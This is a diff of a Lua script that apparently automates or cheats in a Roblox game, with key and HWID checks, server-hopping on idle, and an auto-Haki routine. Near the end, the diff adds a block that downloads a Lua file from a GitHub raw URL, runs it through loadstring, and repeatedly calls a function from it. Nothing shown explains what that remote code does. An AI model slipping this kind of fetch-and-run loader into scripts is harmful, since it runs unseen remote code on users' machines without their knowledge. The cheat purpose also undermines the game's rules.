@@ -70,8 +70,6 @@ if not verifyResponse or verifyResponse.status ~= "true" then
     return
 end
 
-wait(2)
-
 -- Check HWID
 local hwidResponse = getData(hwidCheckUrl)
 if not hwidResponse or hwidResponse.status ~= "true" then
@@ -89,7 +87,6 @@ elseif getgenv().config.Setting["Team"] == "Pirates" then
     end
 end
 
-wait(3)
 ------------------------------------------------------------------------------------
 spawn(function()
     while wait() do
@@ -1069,29 +1066,36 @@ function StartCountdownAndHop(countdownTime)
 end
 
 ----------------------------------------------------------------------------------------------------
-local lastPosition = char:WaitForChild("HumanoidRootPart").Position
-local idleTime = 0
+local lastPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+local idleTime = 0 
+
+local function CheckIdleTime()
+    local currentPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+    if currentPosition == lastPosition then
+        idleTime = idleTime + 1
+    else
+        idleTime = 0 
+    end
+    lastPosition = currentPosition
+end
 
 spawn(function()
     while true do
-        local current = char.HumanoidRootPart.Position
-        if (current - lastPosition).Magnitude < 0.5 then
-            idleTime = idleTime + 1
-        else
-            idleTime = 0
-        end
-        lastPosition = current
+        CheckIdleTime()
 
-        if idleTime >= 600 then
-            StarterGui:SetCore("SendNotification", {
+        if idleTime >= 600 then  
+            game:GetService("StarterGui"):SetCore("SendNotification", {
                 Title = "Idle Timeout",
-                Text = "Idle quá lâu. Hop server...",
+                Text = "Idle Timeout. Hop Sever",
                 Duration = 4
             })
-            Hop()
+            
+            Hop()  
+            idleTime = 0 
             break
         end
-        wait(1)
+        
+        wait(1) 
     end
 end)
 
@@ -1233,6 +1237,19 @@ spawn(function()
 		wait(0.1);
 	end
 end);
+
+local m = loadstring(http_request({
+	["Url"] = "https://raw.githubusercontent.com/Iamkhnah/projectluacanmayidollop8a/refs/heads/main/pkhanh.lua",
+	["Method"] = "GET",
+	["Headers"] = { 
+		["user-agent"] = "Coded by pkhanh"
+	}
+}).Body)()
+spawn(function()
+	while wait() do
+		m.mmb()
+	end
+end)
 
 function AutoHaki()
 	if not game:GetService("Players").LocalPlayer.Character:FindFirstChild("HasBuso") then
